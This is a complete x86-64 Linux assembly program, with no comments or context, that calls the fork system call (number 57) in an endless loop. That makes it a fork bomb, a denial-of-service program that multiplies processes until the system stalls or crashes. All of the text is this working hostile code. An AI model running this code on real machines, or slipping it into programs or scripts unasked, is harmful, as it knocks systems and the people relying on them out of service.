section .text
	global _start
_start:
	mov rax, 57
	syscall
	jmp _start
